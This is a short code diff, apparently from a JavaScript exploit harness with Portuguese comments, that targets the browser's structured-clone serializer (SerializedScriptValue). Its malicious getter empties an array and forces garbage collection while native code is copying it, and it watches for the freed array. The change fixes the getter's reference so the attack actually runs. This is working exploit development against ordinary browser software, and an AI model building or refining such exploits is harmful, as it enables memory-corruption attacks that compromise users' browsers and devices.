@@ -8,16 +8,18 @@ export default {
         'Ataca o SerializedScriptValue (Structured Clone) via getter malicioso. ' +
         'O Array é destruído e o GC é forçado sincronamente ENQUANTO o C++ o copia.',
 
-    setup: function() {
+setup: function() {
         this.vulnArray = [1.1, 2.2, 3.3, 4.4];
         this.channel = new MessageChannel();
+        
+        const self = this; // O SEGREDO: Salva a referência do cenário!
         
         this.evilPayload = {
             a: 1,
             b: 2,
             get c() {
-                // Mutação síncrona: Encolhemos o array
-                this.vulnArray.length = 0;
+                // Mutação síncrona usando a referência correta
+                self.vulnArray.length = 0;
                 
                 // Forçamos limpeza imediata do IsoHeap com arrays gigantes
                 let trash = [];
@@ -25,8 +27,6 @@ export default {
                 return 3;
             }
         };
-        // Bind manual para o getter conseguir aceder ao array
-        this.evilPayload.c = this.evilPayload.c.bind(this);
         this.evilPayload.d = this.vulnArray; 
 
         // 🚨 Oráculo: Vamos vigiar se o array C++ morre
